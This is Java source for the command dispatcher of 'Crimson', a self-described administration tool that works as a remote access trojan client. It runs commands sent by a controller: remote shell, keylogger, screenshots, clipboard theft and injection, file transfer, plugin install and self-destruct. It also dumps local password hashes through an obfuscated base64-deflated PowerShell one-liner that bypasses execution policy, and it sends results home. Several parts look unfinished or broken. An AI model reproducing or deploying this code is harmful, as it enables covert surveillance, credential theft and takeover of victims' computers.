package subterranean.crimson.permajar.stage2;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;

import subterranean.crimson.permajar.stage1.PermaJar;
import subterranean.crimson.permajar.stage1.Stage1;
import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.permajar.stage2.modules.ClipboardManipulator;
import subterranean.crimson.permajar.stage2.modules.GetInfo;
import subterranean.crimson.permajar.stage2.modules.Power;
import subterranean.crimson.permajar.stage2.modules.PrivCheck;
import subterranean.crimson.permajar.stage2.modules.QuickDownload;
import subterranean.crimson.permajar.stage2.modules.QuickUpload;
import subterranean.crimson.permajar.stage2.modules.RemoteUpdate;
import subterranean.crimson.permajar.stage2.modules.RestartClient;
import subterranean.crimson.permajar.stage2.modules.ScreenShot;
import subterranean.crimson.permajar.stage2.modules.SelfDestruct;
import subterranean.crimson.permajar.stage2.modules.Shell;
import subterranean.crimson.permajar.stage2.modules.keylogger.Keylogger;
import subterranean.crimson.server.PluginOperations;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Cryptography;
import subterranean.crimson.universal.EncType;
import subterranean.crimson.universal.GetFileInfo;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.RoutingTable;
import subterranean.crimson.universal.SigarCollection;
import subterranean.crimson.universal.StreamStore;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.Version;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.containers.TransferContainer;
import subterranean.crimson.universal.objects.InvalidObjectException;
import subterranean.crimson.universal.objects.ObjectTransfer;
import subterranean.crimson.universal.streams.InfoStream;
import subterranean.crimson.universal.streams.PreviewStream;
import subterranean.crimson.universal.streams.RemoteStream;
import subterranean.crimson.universal.streams.Stream;
import subterranean.crimson.universal.transfer.DownloadTransfer;
import subterranean.crimson.universal.transfer.Transfer;
import subterranean.crimson.universal.transfer.UploadTransfer;
import subterranean.crimson.universal.translation.T;

public enum Executor {
	;

	public static void execute(final Message m) {

		// decode the aux if needed
		if (Stage1.options.encryptionType != EncType.None) {
			for (int i = 0; i < m.auxObject.length; i++) {
				try {
					m.auxObject[i] = ObjectTransfer.fromString(Cryptography.decrypt((byte[]) m.auxObject[i], Stage1.options.encryptionType, Stage1.options.key), false);
				} catch (InvalidObjectException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		}
		new Thread(new Runnable() {
			public void run() {
				exe(m);
			}
		}).start();
	}

	private static void exe(Message m) {

		switch (m.getName()) {
		case BMN.CLIENT_getBasicInfo: {
			Logger.add("Sending Info");

			Message r = new Message(m.getStreamID(), m.getName(), GetInfo.run());
			Communications.sendHome(r);
			break;

		}
		case BMN.SHELL_execute: {
			Logger.add("Executing command");
			String[] output = null;

			for (Shell s : Stage2.shells) {
				if (s.shellId == (Integer) m.auxObject[1]) {
					output = s.run((String) m.auxObject[0]);
				}

			}

			Message r = new Message(m.getStreamID(), m.getName(), output);

			Communications.sendHome(r);
			break;
		}
		case BMN.SHELL_initialize: {
			Logger.add("Initializing shell");
			Shell shell = new Shell();
			shell.initialize();

			Stage2.shells.add(shell);

			Message r = new Message(m.getStreamID(), m.getName(), shell.shellId);
			Communications.sendHome(r);

			break;
		}
		case BMN.SHELL_kill: {
			Logger.add("Killing shell");
			Shell shell = null;
			for (Shell s : Stage2.shells) {
				if (s.shellId == (Integer) m.auxObject[0]) {
					shell = s;
					break;
				}

			}
			Stage2.shells.remove(shell);
			shell.close();

			break;
		}
		case BMN.CLIENT_uninstall: {
			Logger.add(T.t("Self destructing"));
			SelfDestruct.run();
			break;
		}
		case BMN.POWER_restart: {
			Logger.add(T.t("Restarting host"));
			boolean test = Power.test_restart();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.restart();
			}

			break;
		}
		case BMN.CLIENT_restart: {

			Logger.add("Restarting client");
			RestartClient.run();
			break;
		}
		case BMN.POWER_shutdown: {
			Logger.add(T.t("Shutting down host"));
			boolean test = Power.test_shutdown();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.shutdown();
			}

			break;
		}
		case BMN.CLIENT_shutdown: {
			Logger.add(T.t("Shutting down client"));
			System.exit(0);

			break;
		}
		case BMN.POWER_hibernate: {
			Logger.add(T.t("Hibernating host"));
			boolean test = Power.test_hibernate();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.hibernate();
			}
			break;
		}
		case BMN.USER_logoff: {
			Logger.add("Logging host off");
			boolean test = Power.test_logoff();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.logoff();
			}
			break;
		}
		case BMN.POWER_standby: {
			Logger.add("Standing by");
			boolean test = Power.test_standby();
			Communications.sendHome(new Message(m.getStreamID(), m.getName(), test));
			if (test) {
				Power.standby();
			}
			break;
		}
		case BMN.CLIENT_relocate: {
			// TODO Add implementation

			break;
		}
		case BMN.DISCONNECTION: {
			Logger.add(T.t("Server is disconnecting"));
			if (Version.release) {
				// wait a few seconds for server to completely shut down
				try {
					Thread.sleep(15000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				RestartClient.run();
			} else {
				System.exit(0);

			}

			break;
		}

		case BMN.FILEMANAGER_up: {
			Stage2.f.up();
			break;
		}
		case BMN.FILEMANAGER_down: {

			Stage2.f.down((String) m.auxObject[0]);

			break;
		}
		case BMN.FILEMANAGER_list: {

			Communications.sendHome(new Message(m.getStreamID(), m.getName(), Stage2.f.list()));

			break;
		}
		case BMN.FILEMANAGER_pwd: {

			Communications.sendHome(new Message(m.getStreamID(), m.getName(), Stage2.f.pwd()));

			break;

		}
		case BMN.FILEMANAGER_delete: {

			Stage2.f.delete((String) m.auxObject[0]);

			break;
		}

		case BMN.KEYLOGGER_getLog: {
			Message r = new Message(m.getStreamID(), m.getName(), Stage2.getSettings().keyloggerLog);

			Communications.sendHome(r);

			break;
		}
		case BMN.CLIENT_assignID: {
			Stage2.getSettings().clientID = (Integer) m.auxObject[0];

			break;
		}
		case BMN.KEYLOGGER_stop: {
			Logger.add(T.t("Stopping keylogger"));

			Keylogger.stop();

			break;
		}
		case BMN.KEYLOGGER_start: {
			Logger.add(T.t("Starting keylogger"));

			Keylogger.start();

			break;
		}
		case BMN.PASSWORD_getLocalHashes: {
			Logger.add("Getting local hashes");
			// TODO Check THIS method
			String hash[] = new Shell().run("powershell -ep bypass -c \"iex $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('y0ytUNDwSy3X9U/KSk0uUfBLLdELT01yzslMzSvR1HPJL8/LyU9MCS4pysxL11DPKCkpsNLXT8os0cup1DdMKgt1DS5R1+TlAgA=')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();\"");

			ArrayList<String> refined = new ArrayList<String>();
			for (String h : hash) {
				if (h.matches("*.:*.:*.:*.:")) {
					// looks like a hash
					refined.add(h);
				}

			}
			String onlyHashes[] = new String[refined.size()];
			for (int i = 0; i < onlyHashes.length; i++) {
				onlyHashes[i] = refined.remove(0);
			}
			Message mres = new Message(m.getStreamID(), m.getName(), onlyHashes);
			Communications.sendHome(mres);

			break;
		}
		case BMN.PROCESSMANAGER_list: {
			Logger.add("Getting process listing");
			Shell tempshell = new Shell();

			String[] output = null;

			if (Platform.windows) {
				tempshell.run("");
			} else {
				tempshell.run("ps -aux");
			}

			Message mres = new Message(m.getStreamID(), m.getName(), output);
			Communications.sendHome(mres);
			break;
		}
		case BMN.CLIENT_getClientLog: {
			Logger.add(T.t("Getting client log"));
			ArrayList<String> log = Logger.retrieve();
			if (log == null) {
				Logger.add("Got null client log");

			}
			Message mres = new Message(m.getStreamID(), m.getName(), log);
			Communications.sendHome(mres);

			break;
		}
		case BMN.CLIENT_update: {
			RemoteUpdate.run((byte[]) m.auxObject[0]);

			break;
		}

		case FILE_upload: {
			DownloadTransfer trans = new DownloadTransfer((Integer) m.auxObject[0], (String) m.auxObject[1], (Integer) m.auxObject[2], (Integer) m.auxObject[3], (Long) m.auxObject[4]);
			Logger.add("Adding transfer to list");
			Stage2.transfers.add(trans);

			break;
		}
		case FILE_download: {
			UploadTransfer trans = new UploadTransfer((String) m.auxObject[0]);
			trans.transferId = (Integer) m.auxObject[1];
			trans.start();
			Stage2.transfers.add(trans);

			break;
		}
		case SCREENSHOT_quick: {

			Message mres = new Message(m.getStreamID(), m.getName(), ScreenShot.run());
			Communications.sendHome(mres);

			break;
		}
		case BMN.CLIPBOARD_inject: {
			ClipboardManipulator clip = new ClipboardManipulator();
			clip.setClipboardContents((String) m.auxObject[0]);

			break;
		}
		case BMN.CLIPBOARD_retrieve: {
			ClipboardManipulator clip = new ClipboardManipulator();
			String c = clip.getClipboardContents();
			Logger.add("Got from clipboard: " + c);
			Message mres = new Message(m.getStreamID(), m.getName(), c);
			Communications.sendHome(mres);

			break;
		}
		/*
		 * case HIVE_convertToVirtual: { Logger.add("Connecting to proxy host"); // this
		 * connection is going virtual, connect to the new gateway
		 * 
		 * Logger.add("Completed virtual conversion"); break; } case
		 * HIVE_newVirtualClient: {
		 * Logger.add("Opening temporary listener for virtual connection"); // open a
		 * server to accept the connection ProxyConnection pcon = null; try { ServerSocket
		 * Ssock = new ServerSocket(2020);
		 * Logger.add("Accepting connections on port: 2020"); Socket sock =
		 * Ssock.accept(); Ssock.close(); Logger.add("Server Socket closed");
		 * Logger.add("Adding proxyconnection"); pcon = new ProxyConnection(sock);
		 * pcon.clientID = (Integer) m.auxObject[0]; pcon.start();
		 * 
		 * Stage2.pConnections.add(pcon); } catch (IOException e) { // TODO Auto-generated
		 * catch block e.printStackTrace(); } RoutingTable.routes.put(pcon.clientID,
		 * pcon.clientID);
		 * 
		 * Logger.add("Added new virtual client"); break; }
		 */
		case BMN.FILEMANAGER_getFileInfo: {
			HashMap<String, Object> info = GetFileInfo.run((String) m.auxObject[0]);
			Message mres = new Message(m.getStreamID(), m.getName(), info);
			Communications.sendHome(mres);

			break;
		}
		case TRANSFER_pause: {
			int transferID = (Integer) m.auxObject[0];

			Logger.add("Pausing transfer: " + transferID);

			// find transfer and pause it
			for (Transfer t : Stage2.transfers) {
				if (t.transferId == transferID) {
					if (t instanceof UploadTransfer) {
						UploadTransfer ut = (UploadTransfer) t;
						ut.pause();

					} else {
						DownloadTransfer dt = (DownloadTransfer) t;
						dt.pause();

					}
				}

			}

			break;
		}
		case TRANSFER_resume: {
			int transferID = (Integer) m.auxObject[0];

			Logger.add("Resuming transfer: " + transferID);

			// find transfer and resume it
			for (Transfer t : Stage2.transfers) {
				if (t.transferId == transferID) {
					if (t instanceof UploadTransfer) {
						UploadTransfer ut = (UploadTransfer) t;
						ut.unpause();

					} else {
						DownloadTransfer dt = (DownloadTransfer) t;
						dt.unpause();

					}
				}

			}
			break;
		}
		case TRANSFER_terminate: {
			int transferID = (Integer) m.auxObject[0];

			Logger.add("Terminating transfer: " + transferID);

			// find transfer and kill it
			for (Transfer t : Stage2.transfers) {
				if (t.transferId == transferID) {
					if (t instanceof UploadTransfer) {
						UploadTransfer ut = (UploadTransfer) t;
						ut.terminate();

					} else {
						DownloadTransfer dt = (DownloadTransfer) t;
						dt.terminate();

					}
				}

			}
			break;
		}
		case TRANSFER_data: {
			for (Transfer t : Stage2.transfers) {
				if (t instanceof DownloadTransfer) {
					if (t.transferId == (int) m.auxObject[0]) {
						((DownloadTransfer) t).add((TransferContainer) m.auxObject[1]);
					}
				}
			}

		}
		case TRANSFER_getMD5: {
			for (Transfer t : Stage2.transfers) {
				if (t.transferId == (Integer) m.auxObject[0]) {
					// send the md5 back
					int slept = 0;
					while (slept < 10) {
						if (t.sha1 == null) {
							try {
								Thread.sleep(3000);
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}

						} else {
							Message mres = new Message(m.getStreamID(), MN.TRANSFER_getMD5, t.sha1);
							Communications.sendHome(mres);

						}
					}
					break;
				}
			}

			break;
		}
		case BMN.SIGAR_gather: {
			Logger.add("Running SIGAR collection");
			Message mres = new Message(m.getStreamID(), m.getName(), SigarCollection.run());
			Communications.sendHome(mres);

			break;
		}
		case BMN.CHAT_message: {
			// display it
			Stage2.chat.addMessage((String) m.auxObject[0], (String) m.auxObject[1]);
			break;
		}
		case CHAT_invisible: {
			Stage2.chat.setVisible(false);
			break;
		}
		case CHAT_visible: {
			Stage2.chat.setVisible(true);
			if (!(boolean) m.auxObject[0]) {
				// hide the buttons
				Logger.add("Hiding buttons");
				subterranean.crimson.universal.Utilities.removeMinMaxClose(Stage2.chat);

			}

			break;
		}
		case CHAT_isSessionOpen: {
			Message mres = new Message(m.getStreamID(), m.getName(), Stage2.chat.isVisible());
			Communications.sendHome(mres);

			break;
		}
		case BMN.PLUGIN_install: {
			byte[] p = (byte[]) m.auxObject[0];
			String pac = (String) m.auxObject[1];
			PluginOperations.installRemote(p, pac);

			break;
		}
		case STREAM_control_start_preview: {
			PreviewStream ps = new PreviewStream((long) m.auxObject[1], false, (int) m.auxObject[2]);
			ps.setStreamID((int) m.auxObject[0]);
			StreamStore.streams.add(ps);
			break;
		}
		case STREAM_control_start_info: {
			InfoStream ps = new InfoStream((long) m.auxObject[1], false);
			ps.setStreamID((int) m.auxObject[0]);
			StreamStore.streams.add(ps);
			break;
		}
		case STREAM_control_start_remote: {
			RemoteStream rs = new RemoteStream(1000, false);
			rs.setStreamID((int) m.auxObject[0]);
			StreamStore.streams.add(rs);
			break;
		}
		case BMN.STREAM_control_start_reverse_remote: {
			RemoteStream rs = new RemoteStream(1000, false);// add player
			rs.setStreamID((int) m.auxObject[0]);
			StreamStore.streams.add(rs);
			break;
		}
		case BMN.STREAMCONTROL_stop: {
			StreamStore.removeStream((int) m.auxObject[0]);
			break;
		}
		case BMN.STREAM_data: {
			for (Stream s : StreamStore.streams) {

				if (s.getStreamID() == ((int) m.auxObject[0])) {
					s.received(m);
					return;
				}
			}
			Logger.add("Dropped stream data packet");
			break;
		}
		case BMN.CLIENT_stageQuery: {
			Message mres = new Message(m.getStreamID(), m.getName(), PermaJar.isStage2() ? 2 : 1);
			Communications.sendHome(mres);

			break;
		}
		case BMN.CLIENT_sendStage: {

			String pathToJar = "";
			// load
			try {
				JarFile jarFile = new JarFile(pathToJar);
				Enumeration e = jarFile.entries();

				URL[] urls = { new URL("jar:file:" + pathToJar + "!/") };
				URLClassLoader cl = URLClassLoader.newInstance(urls);

				while (e.hasMoreElements()) {
					JarEntry je = (JarEntry) e.nextElement();
					if (je.isDirectory() || !je.getName().endsWith(".class")) {
						continue;
					}
					// -6 because of .class
					String className = je.getName().substring(0, je.getName().length() - 6);
					className = className.replace('/', '.');
					Class c = cl.loadClass(className);

				}
			} catch (ClassNotFoundException | IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			break;
		}

		default: {
			MessageBuffer.addMessage(m);
		}

		}

	}

}
